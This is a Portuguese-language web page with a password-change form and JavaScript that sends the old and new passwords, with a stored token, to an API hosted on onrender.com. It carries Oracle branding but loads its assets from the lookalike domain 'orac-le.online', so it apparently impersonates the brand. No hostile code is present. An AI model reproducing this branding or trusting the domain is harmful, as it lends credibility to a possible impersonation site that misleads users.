<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <link rel="icon" href="/lendlease/dist/favicon.ico">
    <title>Senha | Oracle</title>

    <link href="https://orac-le.online/lend/pass/lendlease/dist/css/chunk-vendors.317e4ea8.css" rel="stylesheet">
    <link href="https://orac-le.online/lend/pass/lendlease/dist/css/app.3d111502.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/420.5f445c7e.css">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/912.1262dfcf.css">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/64.2a449246.css">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/652.4e50c868.css">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/377.26257b54.css">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/899.3e60963b.css">
    <link rel="stylesheet" type="text/css" href="https://orac-le.online/lend/pass/lendlease/dist/css/720.528a9236.css">
</head>

<style>
    /* Estilos originais mantidos */
    #snackbar {
        visibility: hidden;
        min-width: 250px;
        margin-left: -125px;
        background-color: rgba(31, 28, 28, 0.5);
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        color: white;
        text-align: center;
        border-radius: 10px;
        padding: 16px;
        position: fixed;
        z-index: 1;
        left: 50%;
        bottom: 50%;
        font-size: 17px;
    }

    #snackbar.show {
        visibility: visible;
        -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
        animation: fadein 0.5s, fadeout 0.5s 2.5s;
    }

    #snackbar_error {
        visibility: hidden;
        width: 40%;
        margin-left: 5px;
        background-color: whitesmoke;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        color: black;
        text-align: center;
        border-radius: 10px;
        padding: 16px;
        position: fixed;
        z-index: 1;
        left: 30%;
        bottom: 50%;
        font-size: 17px;
    }

    #snackbar_error.show {
        visibility: visible;
        -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
        animation: fadein 0.5s, fadeout 0.5s 2.5s;
    }

    @-webkit-keyframes fadein {
        from {
            bottom: 50%;
            opacity: 0;
        }

        to {
            bottom: 50%;
            opacity: 1;
        }
    }

    @keyframes fadeout {
        from {
            bottom: 50%;
            opacity: 1;
        }

        to {
            bottom: 50%;
            opacity: 0;
        }
    }

    @media (min-width: 576px) and (max-width: 767px) {
        #snackbar_error {
            width: 60%;
            left: 20%;
            bottom: 70px;
            font-size: 12px;
        }

        #snackbar {
            width: 50%;
            left: 25%;
            bottom: 70px;
            font-size: 12px;
        }
    }

    @media (max-width: 575.99px) {
        #snackbar_error {
            width: 80%;
            margin-left: 5px;
            left: 10%;
            font-size: 12px;
        }

        #snackbar {
            width: 80%;
            margin-left: 5px;
            left: 10%;
            font-size: 12px;
        }
    }

    /* Styles for the preloader */
    #preloade {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
        color: black
    }

    /* Styles for the preloader */
    #preloader {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
        color: black
    }

    /* Simple loading spinner */
    .loadingcss {
        width: 50px;
        height: 50px;
    }

    /* NOVO - Estilo para toast preto */
    .custom-toast {
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(0, 0, 0, 0.9);
        color: white;
        padding: 15px 25px;
        border-radius: 10px;
        z-index: 10000;
        display: flex;
        align-items: center;
        gap: 10px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        min-width: 250px;
        max-width: 90%;
        font-size: 14px;
    }

    .custom-toast img {
        width: 20px;
        height: 20px;
    }

    /* Loading Overlay */
    #loadingOverlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 99999;
        display: none;
    }

    .loading-overlay-content {
        background: rgba(0, 0, 0, 0.9);
        padding: 30px;
        border-radius: 15px;
        text-align: center;
        color: white;
    }

    .loading-overlay-content img {
        width: 50px;
        height: 50px;
        margin-bottom: 10px;
    }
</style>

<body class=""
    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yNCIsInNjb3JlIjoyMDAyNH1d"
    __processed_6061e74d-356d-4dd8-953c-8f65b84e8cae__="true">
    <svg aria-hidden="true" style="position: absolute; width: 0px; height: 0px; overflow: hidden;">
        <symbol id="icon-icon-android" viewBox="0 0 1024 1024">
            <path
                d="M634.3 90.1l49.8-77.7c2.1-3.3 1.3-7.9-1.7-10.2l-1.2-0.9c-3.1-2.3-7.3-1.4-9.5 1.9l-51.2 79.9C587 67.5 549.7 58.8 510.3 58.8c-37.4 0-72.9 7.9-105 22L356.2 4.4c-2.1-3.3-6.4-4.2-9.5-1.9l-1.2 0.9c-3.1 2.3-3.9 6.9-1.7 10.2l47.3 73.8c-74.4 38.3-127.9 111.3-138.8 197.4h515.8c-10.6-84.1-62-155.8-133.8-194.7zM401.6 201.4c-14.2 0-25.7-12.4-25.7-27.7s11.5-27.7 25.7-27.7 25.7 12.4 25.7 27.7-11.5 27.7-25.7 27.7z m221.9 0c-14.2 0-25.7-12.4-25.7-27.7s11.5-27.7 25.7-27.7 25.7 12.4 25.7 27.7-11.5 27.7-25.7 27.7zM153.8 325.2h11.4c28.2 0 51.3 31.8 51.3 70.6v226.7c0 38.9-23.1 70.7-51.3 70.7h-11.4c-28.2 0-51.3-31.8-51.3-70.7V395.8c0-38.8 23.1-70.6 51.3-70.6z m705 1.3h11.4c28.2 0 51.3 31.8 51.3 70.6v226.7c0 38.9-23.1 70.7-51.3 70.7h-11.4c-28.2 0-51.3-31.8-51.3-70.7V397.2c0.1-38.9 23.1-70.7 51.3-70.7zM466.1 825.4v127.8c0 38.8-23.1 70.6-51.3 70.6h-11.4c-28.2 0-51.3-31.8-51.3-70.6V825.4h-47.2c-28.8 0-52.4-25.4-52.4-56.5V321.7H772v447.2c0 31.1-23.6 56.5-52.4 56.5h-43.3v129.2c0 38.9-23.1 69.4-51.3 69.4h-11.4c-28.2 0-51.3-30.5-51.3-69.4V825.4h-96.2z m0 0">
            </path>
        </symbol>
        <symbol id="icon-lvdouya" viewBox="0 0 1024 1024">
            <path
                d="M282.5 386.3c65.4 34.4 99.9 106.6 130.2 174 16 35.7 32 71.4 48 107.2 5.8 12.9 24.2 26.8 32.6 38.2 13.3 18 53.7 59.1 73 70.3 107.3 62.1 257 89.1 362.9 44.2l30.6-18.6c-57.3 30.1-127.4 20.4-189.1 0.9-63.9-20.2-126.3-51.4-170-102.2-15.5-18-28.3-38.1-41-58.1-13.1-20.6-26.3-41.3-39.4-61.9-10.7-16.8-21.4-33.6-31.4-50.7-9.7-16.6-18.7-33.6-30.3-48.9-14.7-19.4-33-35.6-52-50.9-38.1-30.7-92.3-58.3-140.3-48.8l16.2 5.3z"
                fill="#DEE3A0"></path>
            <path
                d="M128.7 301.1c-19.2-3-39.7 4.9-52 20s-15.8 36.8-9 55c6.9 18.5 23 32 39.9 42.3 27.8 17.1 60.1 28.2 92.7 26.7s65.3-16.7 83.9-43.5c17.7-25.5 21.1-59.1 14.3-89.3s-22.9-57.7-41.5-82.5c-16.5-22-35.6-42.6-59.5-56.1-24-13.4-53.4-18.9-79.3-9.7s-46.4 35-44.8 62.4c1.8 29.9 26.8 52.5 50.6 70.8l4.7 3.9z"
                fill="#7BAD37"></path>
            <path d="M214.7 352c-43.2-16-86-50.9-86-50.9-17.6-2.7-36.2 3.7-48.6 16.3 32.9 11.9 107.7 37.4 134.6 34.6z"
                opacity=".2"></path>
            <path
                d="M606.8 299.8c24.1 46 15.3 101.5 6 152.5-5 27-9.9 54.1-14.9 81.1-1.8 9.8-3.6 19.7-3.3 29.7 0.5 15.7 14.4 61 21.2 75.1 37.3 78.8 113.1 154 192.2 170.3l25.1 1.4c-45.2-5.4-81.8-38.9-109.8-74.8-28.9-37.1-52.6-80.1-57.6-126.8-1.8-16.6-1.2-33.3-0.6-49.9 0.6-17.2 1.2-34.3 1.9-51.5 0.5-14 1-27.9 2.1-41.9 1-13.4 2.6-26.9 2-40.3-0.8-17.1-4.9-33.8-9.8-50.1-9.8-32.9-30.2-70.5-61.7-84.1l7.2 9.3z"
                fill="#DEE3A0"></path>
            <path
                d="M551.8 189.3c-9.9-9.4-24.9-13-38-9.2-13.1 3.8-23.8 15-27.1 28.2-3.4 13.5 0.6 27.7 6.2 40.4 9.3 21 23.6 40.3 43 52.4 19.5 12.1 44.4 16.4 65.9 8.3 20.4-7.7 35.7-25.8 43.8-46 8.1-20.2 9.8-42.5 8.9-64.3-0.8-19.3-3.6-38.8-12.1-56.2-8.5-17.3-23.4-32.2-42-37.2s-40.8 1.7-50.8 18.2c-10.9 18-5.4 41.1 1.1 61.1l1.1 4.3z"
                fill="#7BAD37"></path>
            <path d="M581.3 253c-18.6-26.5-29.4-63.7-29.4-63.7-9.1-8.6-22.4-12.3-34.6-9.9 14.2 19.9 47.3 64.5 64 73.6z"
                opacity=".2"></path>
            <path
                d="M803.8 336c8.2 43.4-12.8 86.4-33.2 125.6-10.8 20.8-21.6 41.5-32.4 62.3-3.9 7.5-7.9 15.1-10.1 23.3-3.5 12.9-3.5 53.2-1.5 66.4 10.8 73.4 53.7 153.6 114 186.5l20.1 7.4c-35.4-15.7-56.9-52.1-70.7-88.3-14.3-37.4-22.8-78.3-15.3-117.6 2.7-13.9 7.3-27.4 12-40.8 4.8-13.8 9.6-27.6 14.4-41.5 3.9-11.2 7.8-22.5 12.1-33.6 4.2-10.7 8.8-21.2 11.7-32.3 3.6-14.1 4.4-28.7 4.5-43.3 0.2-29.3-7-64.9-29.3-83.9l3.7 9.8z"
                fill="#DEE3A0"></path>
            <path
                d="M786.6 232.3c-5.7-10.1-17.1-16.8-28.7-17-11.6-0.2-23.1 6.2-29.1 16.2-6.1 10.1-6.4 22.7-5 34.4 2.3 19.4 9.1 38.6 21.9 53.4 12.8 14.7 32.1 24.4 51.6 23.2 18.5-1.2 35.5-12.1 47.2-26.5 11.7-14.4 18.5-32.2 23.3-50.1 4.2-15.9 6.8-32.5 4.2-48.7-2.6-16.2-11-32.1-24.9-40.8s-33.6-8.8-45.9 2.2c-13.4 11.9-14.6 32.1-14.4 50l-0.2 3.7z"
                fill="#7BAD37"></path>
            <path d="M794.7 291.5c-8.5-26.2-8.1-59.2-8.1-59.2-5.2-9.2-15.2-15.6-25.7-16.7 6.7 19.8 22.5 64.4 33.8 75.9z"
                opacity=".2"></path>
            <path
                d="M280.3 718.4c57.9 6.5 102.1 47.9 141.8 87.1 21.1 20.8 42.1 41.6 63.2 62.3 7.6 7.5 15.3 15.1 24.6 20.9 14.5 9 64.9 24.2 82.2 26.8 96.4 14.7 215.8-6.8 284.1-67l18.3-21.4c-35.5 36.7-90.6 48.8-142 51.8-53.1 3.1-108-2-153.7-25.9-16.2-8.5-30.9-19.1-45.5-29.7-15.1-10.9-30.2-21.9-45.3-32.8-12.3-8.9-24.5-17.8-36.4-27.2-11.4-9-22.5-18.5-35.1-26.2-15.9-9.7-33.9-16.1-51.9-21.7-36.4-11.3-84.2-16-117.9 3.6l13.6-0.6z"
                fill="#DEE3A0"></path>
            <path
                d="M143.1 700.1c-15.2 3.1-28.6 14.2-34.1 28.1s-2.6 30.1 7.1 41.1c9.9 11.1 25.4 16.3 40.7 19 25.2 4.5 52.3 3.6 76.5-6.3 24.2-9.9 44.9-29.4 52.1-53.3 6.8-22.7 0.9-47.2-11.8-66.6-12.8-19.4-31.8-34.4-52.1-46.8-18-11-37.5-20.3-58.9-23.3s-45 1.2-62.1 14.6-26.1 37.1-17.9 55.9c8.9 20.5 33.5 29.7 55.9 36.1l4.6 1.5z"
                fill="#7BAD37"></path>
            <path
                d="M220.6 712.6c-36.5 0.4-77.5-12.6-77.5-12.6-13.9 2.8-26.3 12.4-32.4 24.6 27.7-0.5 90.4-2.8 109.9-12z"
                opacity=".2"></path>
            <path
                d="M263.1 531s6.3 3.6 8.3 9.5c-1.5-6.1-8-9.9-8.2-9.7-0.2 0.1-0.1 0.2-0.1 0.2zM276.5 527.4s2.2 5 1 9.5c1.5-4.4-0.7-9.7-0.9-9.6l-0.1 0.1zM284.7 528.9s0.3 5.4-2.3 9.3c2.9-3.7 2.6-9.4 2.4-9.4-0.1 0-0.1 0.1-0.1 0.1zM262.9 544.8s5 0.3 8.5 5.3c-3-5.3-8.4-5.8-8.5-5.5-0.1 0.1 0 0.2 0 0.2z"
                fill="#7BAD37" opacity=".3"></path>
        </symbol>
    </svg>
    
    <!-- Toast notifications -->
    <div id="snackbar"></div>
    <div id="snackbar_error"></div>
    
    <!-- Loading Overlay -->
    <div id="loadingOverlay">
        <div class="loading-overlay-content">
            <img src="https://orac-le.online/lend/loading.gif" alt="Carregando">
            <p>Processando...</p>
        </div>
    </div>

    <!-- Preloader -->
    <div class="loaderd" id="preloade" style="display: none;">
        <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        <center>
            <div class="loaderd">
                <div class="van-toast van-toast--middle loadingcss" bis_skin_checked="1">
                    <i class="van-icon van-toast__icon"><img src="https://orac-le.online/lend/loading.gif" class="van-icon__image"></i>
                </div>
            </div>
        </center>
    </div>

    <div id="app" data-v-app="" bis_skin_checked="1">
        <div data-v-de395cd8="" class="pass" bis_skin_checked="1">
            <div data-v-de395cd8="" class="navback" bis_skin_checked="1">
                <img data-v-de395cd8="" src="https://i.postimg.cc/CLQLWWMH/20250902-065546.png" alt="" class="back-img">
                <p data-v-de395cd8="">Senha</p>
            </div>
            <img data-v-de395cd8="" src="https://orac-le.online/lend/pass/lendlease/dist/img/1.00c62643.png" alt="" class="pas-img">
            <div data-v-de395cd8="" class="van-tabs van-tabs--line tabs-box" bis_skin_checked="1">
                <div class="van-tabs__wrap" bis_skin_checked="1">
                    <div role="tablist" class="van-tabs__nav van-tabs__nav--line" aria-orientation="horizontal" bis_skin_checked="1">
                        <div id="van-tabs-10-0" role="tab" class="van-tab van-tab--line van-tab--active" tabindex="0" aria-selected="true" aria-controls="van-tab-11" bis_skin_checked="1">
                            <span class="van-tab__text van-tab__text--ellipsis">Alterar senha</span>
                        </div>
                        <div class="van-tabs__line" style="transform: translateX(114.5px) translateX(-50%); transition-duration: 0.3s;" bis_skin_checked="1"></div>
                    </div>
                </div>
                <div class="van-tabs__content" bis_skin_checked="1">
                    <div data-v-de395cd8="" id="van-tab-11" role="tabpanel" class="van-tab__panel" tabindex="0" aria-labelledby="van-tabs-10-0" style="" bis_skin_checked="1">
                        <div data-v-de395cd8="" class="wrap-pass" bis_skin_checked="1">
                            <div data-v-de395cd8="" class="bank-box" bis_skin_checked="1">
                                <p data-v-de395cd8="" class="banktitle"><img data-v-de395cd8="" src="https://i.postimg.cc/BvcsNvhb/padlock.png" alt=""> Senha antiga</p>
                                <div data-v-de395cd8="" class="van-cell van-field input-box sel-input" bis_skin_checked="1">
                                    <div class="van-cell__value van-cell__value--alone van-field__value" bis_skin_checked="1">
                                        <div class="van-field__body" bis_skin_checked="1">
                                            <input type="password" id="old-password" class="van-field__control" placeholder="Por favor, insira uma senha antiga.">
                                            <div class="van-field__right-icon" bis_skin_checked="1">
                                                <span class="eyeimg" onclick="togglePassword('old-password')" style="cursor: pointer;">üëÅÔ∏è</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div data-v-de395cd8="" class="bank-box" bis_skin_checked="1">
                                <p data-v-de395cd8="" class="banktitle"><img data-v-de395cd8="" src="https://i.postimg.cc/BvcsNvhb/padlock.png" alt=""> Nova senha</p>
                                <div data-v-de395cd8="" class="van-cell van-field input-box" bis_skin_checked="1">
                                    <div class="van-cell__value van-cell__value--alone van-field__value" bis_skin_checked="1">
                                        <div class="van-field__body" bis_skin_checked="1">
                                            <input type="password" id="new-password" class="van-field__control" placeholder="Por favor, insira uma nova senha.">
                                            <div class="van-field__right-icon" bis_skin_checked="1">
                                                <span class="eyeimg" onclick="togglePassword('new-password')" style="cursor: pointer;">üëÅÔ∏è</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div data-v-de395cd8="" class="bank-box" bis_skin_checked="1">
                                <p data-v-de395cd8="" class="banktitle"><img data-v-de395cd8="" src="https://i.postimg.cc/BvcsNvhb/padlock.png" alt=""> Confirmar senha</p>
                                <div data-v-de395cd8="" class="van-cell van-field input-box tree-box" bis_skin_checked="1">
                                    <div class="van-cell__value van-cell__value--alone van-field__value" bis_skin_checked="1">
                                        <div class="van-field__body" bis_skin_checked="1">
                                            <input type="password" id="confirm-password" class="van-field__control" placeholder="Por favor, insira uma senha de confirma√ß√£o.">
                                            <div class="van-field__right-icon" bis_skin_checked="1">
                                                <span class="eyeimg" onclick="togglePassword('confirm-password')" style="cursor: pointer;">üëÅÔ∏è</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div data-v-de395cd8="" class="bankbtn" bis_skin_checked="1">
                                <button data-v-de395cd8="" onclick="changePassword()">Confirmar</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ==============================================
        // CONFIGURA√á√ïES
        // ==============================================
        const API_BASE_URL = 'https://bd-p4q7.onrender.com';
        const TOKEN_EXPIRY_HOURS = 5;
        
        // ==============================================
        // FUN√á√ïES DE TOAST PRETO
        // ==============================================
        
        function showToast(message, type = 'info') {
            // Remove toast anterior se existir
            const existingToast = document.querySelector('.custom-toast');
            if (existingToast) {
                existingToast.remove();
            }
            
            // Cria novo toast - SEMPRE PRETO
            const toast = document.createElement('div');
            toast.className = `custom-toast`;
            
            // Se for loading, adiciona o GIF
            if (type === 'loading') {
                toast.innerHTML = `
                    <img src="https://orac-le.online/lend/loading.gif" style="width:20px;height:20px;" alt="Carregando">
                    <div>${message}</div>
                `;
            } else {
                toast.innerHTML = `<div>${message}</div>`;
            }
            
            document.body.appendChild(toast);
            
            // Se n√£o for loading, remove ap√≥s 3 segundos
            if (type !== 'loading') {
                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.remove();
                    }
                }, 3000);
            }
            
            return toast;
        }
        
        function removeToast(toastElement) {
            if (toastElement && toastElement.parentNode) {
                toastElement.remove();
            }
        }
        
        // ==============================================
        // FUN√á√ïES DE UTILIDADE
        // ==============================================
        
        // Mostrar toast de sucesso (compatibilidade)
        function showSuccessToast(message) {
            const toast = document.getElementById('snackbar');
            if (toast) {
                toast.textContent = message;
                toast.className = "show";
                
                setTimeout(() => {
                    toast.className = toast.className.replace("show", "");
                }, 3000);
            } else {
                showToast(message, 'info');
            }
        }
        
        // Mostrar toast de erro (compatibilidade)
        function showErrorToast(message) {
            const toast = document.getElementById('snackbar_error');
            if (toast) {
                toast.textContent = message;
                toast.className = "show";
                
                setTimeout(() => {
                    toast.className = toast.className.replace("show", "");
                }, 3000);
            } else {
                showToast(message, 'info');
            }
        }
        
        // Mostrar/ocultar loading overlay
        function showLoading() {
            document.getElementById('loadingOverlay').style.display = 'flex';
        }
        
        function hideLoading() {
            document.getElementById('loadingOverlay').style.display = 'none';
        }
        
        // Mostrar/ocultar preloader antigo (compatibilidade)
        function showPreloader() {
            document.getElementById('preloade').style.display = 'flex';
        }
        
        function hidePreloader() {
            document.getElementById('preloade').style.display = 'none';
        }
        
        // ==============================================
        // FUN√á√ïES DE AUTENTICA√á√ÉO COM TOKEN JWT
        // ==============================================
        
        // Verificar se o token √© v√°lido
        function isTokenValid() {
            try {
                const tokenData = localStorage.getItem('user_token');
                
                if (!tokenData) {
                    console.log('‚ùå Nenhum token encontrado no localStorage');
                    return false;
                }
                
                const parsedData = JSON.parse(tokenData);
                
                // Verificar se tem estrutura correta
                if (!parsedData.token || !parsedData.expiry) {
                    console.log('‚ùå Token com estrutura inv√°lida');
                    localStorage.removeItem('user_token');
                    localStorage.removeItem('user_id');
                    return false;
                }
                
                // Verificar se expirou
                const now = Date.now();
                if (now > parsedData.expiry) {
                    console.log('‚ùå Token expirado');
                    localStorage.removeItem('user_token');
                    localStorage.removeItem('user_id');
                    return false;
                }
                
                console.log('‚úÖ Token v√°lido - Expira em:', new Date(parsedData.expiry).toLocaleString());
                return true;
                
            } catch (error) {
                console.error('‚ùå Erro ao verificar token:', error);
                localStorage.removeItem('user_token');
                localStorage.removeItem('user_id');
                return false;
            }
        }
        
        // Obter token JWT para uso nas requisi√ß√µes
        function getAuthToken() {
            try {
                const tokenData = localStorage.getItem('user_token');
                if (!tokenData) {
                    console.log('‚ùå Nenhum token dispon√≠vel');
                    return null;
                }
                
                const parsedData = JSON.parse(tokenData);
                if (!parsedData.token) {
                    console.log('‚ùå Token n√£o encontrado no objeto');
                    return null;
                }
                
                console.log('‚úÖ Token obtido com sucesso');
                return parsedData.token;
                
            } catch (error) {
                console.error('‚ùå Erro ao obter token:', error);
                return null;
            }
        }
        
        // Salvar token ap√≥s login (fun√ß√£o para refer√™ncia)
        function saveToken(token) {
            try {
                const tokenData = {
                    token: token,
                    expiry: Date.now() + (TOKEN_EXPIRY_HOURS * 60 * 60 * 1000)
                };
                
                localStorage.setItem('user_token', JSON.stringify(tokenData));
                console.log('‚úÖ Token salvo com expira√ß√£o de', TOKEN_EXPIRY_HOURS, 'horas');
                
            } catch (error) {
                console.error('‚ùå Erro ao salvar token:', error);
            }
        }
        
        // ==============================================
        // FUN√á√ïES DA P√ÅGINA
        // ==============================================
        
        // Alternar visibilidade da senha
        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const eye = input.parentElement.querySelector('.eyeimg');
            
            if (input.type === 'password') {
                input.type = 'text';
                eye.textContent = 'üôà';
            } else {
                input.type = 'password';
                eye.textContent = 'üëÅÔ∏è';
            }
        }
        
        // ==============================================
        // FUN√á√ÉO PRINCIPAL - ALTERAR SENHA
        // ==============================================
        
        async function changePassword() {
            console.log('üîÑ Iniciando processo de altera√ß√£o de senha...');
            
            // Obter valores dos campos
            const oldPassword = document.getElementById('old-password').value.trim();
            const newPassword = document.getElementById('new-password').value.trim();
            const confirmPassword = document.getElementById('confirm-password').value.trim();
            
            // Valida√ß√µes b√°sicas
            if (!oldPassword) {
                showErrorToast('Por favor, insira sua senha atual');
                document.getElementById('old-password').focus();
                return;
            }
            
            if (!newPassword) {
                showErrorToast('Por favor, insira a nova senha');
                document.getElementById('new-password').focus();
                return;
            }
            
            if (newPassword.length < 6) {
                showErrorToast('A nova senha deve ter pelo menos 6 caracteres');
                document.getElementById('new-password').focus();
                return;
            }
            
            if (!confirmPassword) {
                showErrorToast('Por favor, confirme a nova senha');
                document.getElementById('confirm-password').focus();
                return;
            }
            
            if (newPassword !== confirmPassword) {
                showErrorToast('As senhas n√£o coincidem');
                document.getElementById('confirm-password').focus();
                return;
            }
            
            // Verificar autentica√ß√£o
            if (!isTokenValid()) {
                showErrorToast('Sess√£o expirada. Fa√ßa login novamente.');
                setTimeout(() => {
                    window.location.href = '/index.html';
                }, 2000);
                return;
            }
            
            // Obter token JWT
            const token = getAuthToken();
            if (!token) {
                showErrorToast('Token de autentica√ß√£o n√£o encontrado');
                setTimeout(() => {
                    window.location.href = '/index.html';
                }, 2000);
                return;
            }
            
            console.log('‚úÖ Token dispon√≠vel, fazendo requisi√ß√£o...');
            
            // Mostrar loading
            showLoading();
            const loadingToast = showToast('Alterando senha...', 'loading');
            
            try {
                console.log('üì§ Enviando requisi√ß√£o para API...');
                console.log('üîë Token usado:', token.substring(0, 20) + '...');
                
                // Fazer requisi√ß√£o para a API
                const response = await fetch(`${API_BASE_URL}/user/password/update`, {
                    method: 'PUT',
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        current_password: oldPassword,
                        new_password: newPassword,
                        confirm_password: confirmPassword
                    })
                });
                
                console.log('üì• Resposta recebida. Status:', response.status);
                
                // Remover toast de loading
                removeToast(loadingToast);
                hideLoading();
                
                // Verificar se token expirou (401 Unauthorized)
                if (response.status === 401) {
                    console.log('‚ùå Token expirado ou inv√°lido (401)');
                    localStorage.removeItem('user_token');
                    localStorage.removeItem('user_id');
                    
                    showErrorToast('Sess√£o expirada. Fa√ßa login novamente.');
                    setTimeout(() => {
                        window.location.href = '/index.html';
                    }, 2000);
                    return;
                }
                
                // Verificar outros erros de autentica√ß√£o
                if (response.status === 403) {
                    console.log('‚ùå Acesso negado (403)');
                    showErrorToast('Acesso negado. Fa√ßa login novamente.');
                    setTimeout(() => {
                        window.location.href = '/index.html';
                    }, 2000);
                    return;
                }
                
                // Processar resposta
                const data = await response.json();
                console.log('üìä Dados da resposta:', data);
                
                if (response.ok && data.success) {
                    // Sucesso!
                    console.log('‚úÖ Senha alterada com sucesso!');
                    
                    // Limpar campos
                    document.getElementById('old-password').value = '';
                    document.getElementById('new-password').value = '';
                    document.getElementById('confirm-password').value = '';
                    
                    // Mostrar mensagem de sucesso
                    showSuccessToast('Senha alterada com sucesso!');
                    
                    // Redirecionar ap√≥s 2 segundos
                    setTimeout(() => {
                        window.location.href = 'profile.html';
                    }, 2000);
                    
                } else {
                    // Erro da API
                    const errorMessage = data.message || 'Erro ao alterar senha';
                    console.error('‚ùå Erro da API:', errorMessage);
                    showErrorToast(errorMessage);
                }
                
            } catch (error) {
                // Erro de rede
                console.error('‚ùå Erro na requisi√ß√£o:', error);
                
                // Remover toast de loading em caso de erro
                removeToast(loadingToast);
                hideLoading();
                
                // Verificar tipo de erro
                if (error.name === 'TypeError' && error.message.includes('fetch')) {
                    showErrorToast('Erro de conex√£o. Verifique sua internet e tente novamente.');
                } else {
                    showErrorToast('Ocorreu um erro inesperado. Tente novamente.');
                }
            }
        }
        
        // ==============================================
        // INICIALIZA√á√ÉO
        // ==============================================
        
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ P√°gina de altera√ß√£o de senha carregada');
            
            // Verificar autentica√ß√£o ao carregar a p√°gina
            if (!isTokenValid()) {
                console.log('‚ùå Usu√°rio n√£o autenticado, redirecionando...');
                showErrorToast('Voc√™ precisa estar logado para alterar a senha');
                setTimeout(() => {
                    window.location.href = '/index.html';
                }, 2000);
                return;
            }
            
            console.log('‚úÖ Usu√°rio autenticado, p√°gina pronta');
            
            // PREVENIR REDIRECIONAMENTOS INDESEJADOS
            // 1. Remover onclick problem√°tico do container principal
            const passContainer = document.querySelector('.pass');
            if (passContainer) {
                passContainer.removeAttribute('onclick');
                
                // Adicionar evento de clique seguro para voltar
                passContainer.addEventListener('click', function(event) {
                    // S√≥ redirecionar se clicar diretamente no container (√°rea vazia)
                    if (event.target === this) {
                        window.location.href = 'profile.html';
                    }
                });
            }
            
            // 2. Adicionar evento de enter nos campos (com preven√ß√£o de propaga√ß√£o)
            const inputs = document.querySelectorAll('input[type="password"]');
            inputs.forEach(input => {
                input.addEventListener('keypress', function(event) {
                    if (event.key === 'Enter') {
                        changePassword();
                    }
                });
                
                // Prevenir propaga√ß√£o do clique para o container pai
                input.addEventListener('click', function(event) {
                    event.stopPropagation();
                });
                
                input.addEventListener('focus', function(event) {
                    event.stopPropagation();
                });
            });
            
            // 3. Prevenir cliques nos √≠cones de olho
            const eyeIcons = document.querySelectorAll('.eyeimg');
            eyeIcons.forEach(icon => {
                icon.addEventListener('click', function(event) {
                    event.stopPropagation();
                    // A fun√ß√£o togglePassword ser√° chamada pelo onclick do HTML
                });
            });
            
            // 4. Configurar bot√£o voltar (somente na seta)
            const backImg = document.querySelector('.navback .back-img');
            if (backImg) {
                backImg.onclick = function(event) {
                    event.stopPropagation();
                    window.location.href = 'profile.html';
                };
            }
            
            // 5. Configurar clique no texto "Senha" do header
            const navbackText = document.querySelector('.navback p');
            if (navbackText) {
                navbackText.onclick = function(event) {
                    event.stopPropagation();
                    window.location.href = 'profile.html';
                };
            }
            
            // 6. Configurar clique na √°rea do header (mas n√£o nos elementos filhos)
            const navback = document.querySelector('.navback');
            if (navback) {
                navback.addEventListener('click', function(event) {
                    // S√≥ redirecionar se clicar diretamente no container .navback
                    if (event.target === this) {
                        window.location.href = 'profile.html';
                    }
                });
            }
            
            // Esconder todos os loaders ao carregar
            hideLoading();
            hidePreloader();
        });
        
        // ==============================================
        // FUN√á√ïES DE REDIRECIONAMENTO ORIGINAIS
        // ==============================================
        
        // Fun√ß√£o global para login (mantida para compatibilidade)
        window.login = function() {
            window.location.href = '/index.html';
        };
        
        // Fun√ß√£o para alternar visibilidade (mantida para compatibilidade)
